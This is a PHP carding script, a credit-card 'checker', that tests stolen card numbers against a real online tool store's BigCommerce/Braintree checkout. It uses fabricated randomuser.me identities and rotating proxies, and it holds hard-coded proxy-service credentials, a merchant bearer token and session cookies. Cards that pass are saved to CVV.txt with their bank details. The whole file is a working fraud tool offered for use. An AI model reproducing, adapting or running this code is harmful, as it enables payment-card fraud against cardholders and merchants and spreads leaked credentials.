<?php 

require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

#====================== [ SAVE CVV LIVES ] =====================#
function saveCVV($cc) 
{
    $file = dirname(__FILE__) . "/CVV.txt";
    $fp = fopen($file, "a+");
    fwrite($fp, $cc . PHP_EOL);
    fclose($fp);
}

function reizelProxy(){
    $proxy = file("proxy.txt");
    $myproxy = rand(0, sizeof($proxy)-1);
    $proxy = $proxy[$myproxy];
    return $proxy;

}
$proxy = reizelProxy();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, 'postcode":', ',');
$state = value($resposta, 'state":"', '"');
$email = value($resposta, 'email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, 'street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 


///////////////////////////////////////////////////=========[Random-User Api]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?results=5&callback=randomuserdata');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);


$username = 'lum-customer-hl_189a27a3-zone-static';
$password = '0v3b6uapzpnh';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

$cp = curl_init();
curl_setopt($cp, CURLOPT_URL, 'https://api.proxyorbit.com/v1/?token=JXNJZWRXkOMlPxY6H-NL1-2RO0Y-MQ6Ic5DlEIM5IXQ&ssl=true&google=true');


curl_setopt($cp, CURLOPT_HEADER, 0);
curl_setopt($cp, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($cp, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($cp, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($cp, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($cp, CURLOPT_SSL_VERIFYHOST, 0);



$result1 = curl_exec($cp);
$response = json_decode($result1);

curl_close($cp);


$ip = $response->ip;
$port = $response->port;
$protocol = $response->protocol;
$orbit = "$ip:$port";

///////////////////////////////////////////////////=========[Order-Fields]
$user_agent = random_ua();

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_PROXY, $orbit);
//////////======= Socks Proxy
// curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
curl_setopt($ch, CURLOPT_URL, 'https://drillsandcutters.com/internalapi/v1/checkout/order');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"useStoreCredit":false,"customerMessage":""}');
curl_setopt($ch, CURLOPT_HEADER, 1);
$headers = array();
$headers[] = 'accept: application/json, text/plain, */*';
$headers[] = 'cookie: SHOP_SESSION_TOKEN=58fmq91upjiqvmg1o0dh9dtobr;';
$headers[] = 'content-type: application/json';
$headers[] = 'origin: https://drillsandcutters.com';
$headers[] = 'x-xsrf-token: 08c5456b417700cbe5f5dae0cbfd2ff00093fe2612b0e57434fedadbef77e0cb, 08c5456b417700cbe5f5dae0cbfd2ff00093fe2612b0e57434fedadbef77e0cb, 08c5456b417700cbe5f5dae0cbfd2ff00093fe2612b0e57434fedadbef77e0cb';
$headers[] = 'referer: https://drillsandcutters.com/checkout';
$headers[] = 'sec-fetch-mode: cors';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
$ordertoken = trim(strip_tags(getStr($result,'"token":"','",')));
$orderid = trim(strip_tags(getStr($result,'"orderId":',',')));

$jwt = Getstr($result, 'token:',':');
$auth = preg_split('/[\s\n]/', $jwt);

///////////////////////////////////////////////////=========[Graphl-Fields]

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_PROXY, $orbit);
//////////======= Socks Proxy
// curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"e0c2ca4b-09fa-473b-ba20-856baeba2260"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","cardholderName":"'.$firstname.' '.$lastname.'","billingAddress":{"countryName":"United States","postalCode":"'.$zip.'","streetAddress":"'.$street.'"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$headers = array();
$headers[] = 'accept: */*';
$headers[] = 'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1ODc4MjY2OTEsImp0aSI6IjIxNjc5YWQ2LTE3NDktNGM3Mi04MzU2LTAzZWUzMDc4Y2I2NSIsInN1YiI6ImM4M3J2ZHZxYzkyeTR6dHoiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImM4M3J2ZHZxYzkyeTR6dHoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiRHJpbGxzYW5kQ3V0dGVyc2NvbV9pbnN0YW50In19.MRLYpnp2mVKsyjg1Ky0P3lzHpZ99cps-U-oB12fv770gY7Epp8PIgGayEPTnHDO8-Kr1-z4SejtZdDnKZ9m2ZQ';
$headers[] = 'content-type: application/json';
$headers[] = 'origin: https://drillsandcutters.com';
$headers[] = 'braintree-version: 2018-05-10';
$headers[] = 'referer: https://drillsandcutters.com/checkout';
$headers[] = 'sec-fetch-mode: cors';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
$chargetoken = trim(strip_tags(getStr($result,'"token":"','"')));

///////////////////////////////////////////////////=========[Order-Fields]

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_PROXY, $orbit);
//////////======= Socks Proxy
// curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
curl_setopt($ch, CURLOPT_URL, 'https://payments.bigcommerce.com/api/public/v1/orders/payments');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"customer":{"customer_group":{"name":"Retail"},"geo_ip_country_code":"US","session_token":"faec14ecb21b14ee9fcbe9596add2da18590e3d3"},"notify_url":"https://internalapi-725611.mybigcommerce.com/internalapi/v1/checkout/order/'.$orderid.'/payment","order":{"billing_address":{"city":"'.$city.'","country_code":"US","country":"United States","first_name":"'.$firstname.'","last_name":"'.$lastname.'","phone":"'.$phone.'","state_code":"'.$state.'","state":"'.$state.'","street_1":"'.$street.'","zip":"'.$zip.'","email":"'.$email.'"},"coupons":[],"currency":"USD","id":"'.$orderid.'","items":[{"code":"d5b0a5b1-4077-4c02-a475-679bed7fb9e6","variant_id":3142,"name":"#1 x 6\" HSS Aircraft Extension Drill Bit, Drill America","price":395,"unit_price":395,"quantity":1,"sku":"D/AA/CX61"}],"shipping":[{"method":"UPS Collect - UPS Account and Speed Required - Please enter in Comments Box Below"}],"shipping_address":{"city":"'.$city.'","country_code":"US","country":"United States","first_name":"'.$firstname.'","last_name":"'.$lastname.'","phone":"'.$phone.'","state_code":"'.$state.'","state":"'.$state.'","street_1":"'.$street.'","zip":"'.$zip.'"},"token":"'.$chargetoken.'","totals":{"grand_total":395,"handling":0,"shipping":0,"subtotal":395,"tax":0}},"payment":{"device_info":"{\"device_session_id\":\"21ab7ea81c5f6aa678547de8d8a290f9\",\"fraud_merchant_id\":null}","gateway":"braintree","notify_url":"https://internalapi-725611.mybigcommerce.com/internalapi/v1/checkout/order/'.$orderid.'/payment","method":"credit-card","credit_card_token":{"token":"'.$chargetoken.'"}},"store":{"hash":"zbaqm","id":"725611","name":"DrillsandCutters.com"}}'); 
$headers = array();
$headers[] = 'Accept: application/json';
$headers[] = 'Authorization: JWT '.$auth[2].'';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://drillsandcutters.com';
$headers[] = 'Referer: https://drillsandcutters.com/checkout';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Host: payments.bigcommerce.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
$message = trim(strip_tags(getStr($result,'"cvv_result":{"code":"','",')));
$avs = trim(strip_tags(getStr($result,'"avs_result":{"code":"','",')));
$msg = trim(strip_tags(getStr($result,'"errors":[{"code":"','"')));


///////////////////////////////////////////////////=========[Responses]

if(strpos($result, '"code":"M"')) {
  saveCVV("$cc|$mes|$ano|$cvv");
    $binn = substr($cc, 0,6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_PROXY, $orbit);
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$binn);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$binn);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
curl_close($ch);
$data = date("d/m/Y H:i:s");

$banco     = trim(strip_tags(getstr($bin,'"bank":{"name":"','"')));
$brand     = trim(strip_tags(getstr($bin,'"scheme":"','"')));
$lo     = trim(strip_tags(getstr($bin,'"brand":"','"')));
$fone = trim(strip_tags(getstr($bin,'"phone":"','"')));
$tipo = trim(strip_tags(getstr($bin,'},"type":"','"')));
$latitude = trim(strip_tags(getstr($bin,'latitude":',',')));
$logitude = trim(strip_tags(getstr($bin,'longitude":','}}')));
$prepago = trim(strip_tags(getstr($bin,'"prepaid":',',')));
$pais = getStr($bin, '"name":"','"');
   echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada †POTANGINA†</i></font> <font class='badge badge-warning'> $cc|$mes|$ano|$cvv </i></font> <font size=2 color='green'> <font class='badge badge-success'> ♛ newbie ™ ♛  [CVV-$message / AVS-$avs ]</i></font> <font class='badge badge-info'> [ KANTUTAN NA! ] </i></font>  <font class='badge badge-warning'> [ $lo $banco ( $pais )] </i></font><br>";
} 
elseif(strpos($result, '"status":"error"')) {
   echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada †TANGINA†</i></font> <font class='badge badge-warning'> $cc|$mes|$ano|$cvv </i></font><font size=2 color='red'> <font class='badge badge-success'>[$msg |CVV-$message / AVS-$avs ]</i></font><br>";
} 
elseif(strpos($result, '"id":null')) {
   echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada †TANGINA†</i></font> <font class='badge badge-info'> $cc|$mes|$ano|$cvv </i></font><font size=2 color='red'> <font class='badge badge-warning'> Gate Fucked </i></font><br>";
} 
elseif(strpos($result, 'insufficient_funds')) {
   echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada †LAPERA†</i></font> <font class='badge badge-info'> $cc|$mes|$ano|$cvv </i></font><font size=2 color='red'> <font class='badge badge-warning'> insufficient_funds </i></font><br>";
}
else {
   echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada †GAGO†</i></font> <font class='badge badge-white'> $cc|$mes|$ano|$cvv </i></font><font size=2 color='red'> <font class='badge badge-grey'>[Too Many Requests]</i></font><br>";
} 


?>